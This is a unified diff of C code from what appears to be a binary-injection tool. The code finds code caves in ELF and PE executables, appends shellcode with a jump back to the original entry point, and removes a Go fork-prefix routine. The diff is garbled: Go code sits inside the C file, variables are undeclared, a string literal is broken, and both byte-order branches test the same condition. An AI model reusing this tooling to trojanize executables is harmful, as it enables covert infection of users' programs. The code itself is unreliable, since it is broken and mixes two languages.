@@ -20,7 +20,7 @@ int find_code_cave(uint32_t cave_size,uint32_t starting_offset,uint32_t ending_o
    if(b==cave_size)
   return a;
    }
- return 0;
+ return -1;
 }
 int file_type(char* file)
 {
@@ -29,7 +29,7 @@ int file_type(char* file)
  FILE *f
   f=fopen(file,"r");
  if(f==NULL)
-   return 0;
+   return -1;
  else
  {
  fread(buf,sizeof(char),4,f);
@@ -43,66 +43,30 @@ int file_type(char* file)
  if(strcmp(buf,"\x4d\x5a\")==0x00)
   return PE; 
   }
-           return 0;
+           return -1;
 }
-char *apply_suffix_jmp_intel32(char *shellcode,uint32_t shellcodevaddr,uint32_t entrypoint,int byte_order)
-           {
-            int i;
-            i=strlen(shellcode);
-           char *jmp_shellcode=calloc(1,strlen(shellcode)+9); 
-            strcat(jmp_shellcode,shellcode);
-            if(byte_order)
-            {
-             
-             
-             
-            }
-            else
-            {
-             
-             
-             
-            }
-            jmp_shellcode[i]=0x68;
-            jmp_shellcode[i+4]=0xff;
-            jmp_shellcode[i+5]=0x24;
-            jmp_shellcode[i+6]=0x24;
-            return jmp_shellcode;
-           }
-           func ApplyPrefixForkIntel64(shellcode []byte, entryJump uint32, byteOrder binary.ByteOrder) []byte {
-	/*
-		Disassembly:
-		0:  b8 02 00 00 00          mov    eax,0x2
-		5:  cd 80                   int    0x80
-		7:  83 f8 00                cmp    eax,0x0
-		a:  0f 85 xx xx xx xx       jne    <entryJump>
-	*/
-	prefix := bytes.NewBuffer([]byte{0xB8, 0x02, 0x00, 0x00, 0x00, 0xCD, 0x80, 0x83, 0xF8,
-		0x00, 0x0F, 0x85})
-	w := bufio.NewWriter(prefix)
-	binary.Write(w, byteOrder, entryJump)
-	binary.Write(w, byteOrder, shellcode)
-	w.Flush()
-	return prefix.Bytes()
-}
-
-// ApplySuffixJmpIntel64 - Appends instructions to jump to the original entryPoint (the parameter)
-//							Intel x64 Linux version
-//
-//							Returns the resulting shellcode
-func ApplySuffixJmpIntel64(shellcode []byte, shellcodeVaddr uint32, entryPoint uint32, byteOrder binary.ByteOrder) []byte {
-	/*
-		Disassembly:
-		0:  e9 00 00 00 00          jmp    <entryJump>
-	*/
-
-	retval := append(shellcode, 0xe9)
-	buf := bytes.NewBuffer(retval)
-	w := bufio.NewWriter(buf)
-	entryJump := entryPoint - (shellcodeVaddr + 5) - uint32(len(shellcode))
-	binary.Write(w, byteOrder, entryJump)
-	w.Flush()
-	return buf.Bytes()
+char *ApplySuffixJmpIntel64(char *shellcode,uint32_t cave_offset,uint32_t entry_point,int byte_order)  
+{
+        int sclen = strlen(shellcode);
+	char *retval = calloc(1,sclen+6);
+	strcat(retval,shellcode);
+	retval[sclen]=0xe9;
+	uint32_t entryJump = entry_Point - (shellcodeVaddr + 5) - sclen;
+	if(byte_order)
+	{
+		retval[sclen+1]=entryJump>>24;
+		retval[sclen+2]=entryJump>>16;
+		retval[sclen+3]=entryJump>>8;
+		retval[sclen+4]=entryJump;
+	}
+	if(byte_order)
+	{
+		retval[sclen+1]=entryJump;
+		retval[sclen+2]=entryJump>>8;
+		retval[sclen+3]=entryJump>>16;
+		retval[sclen+4]=entryJump>>24;
+	}
+	return retval;
 }
 int binject(char *file,char *shellcode)
            {
@@ -120,7 +84,7 @@ int binject(char *file,char *shellcode)
                binject_ELF(file,shellcode);
               break;
               default:
-               return 0;
+               return -1;
               break;
               }
            }
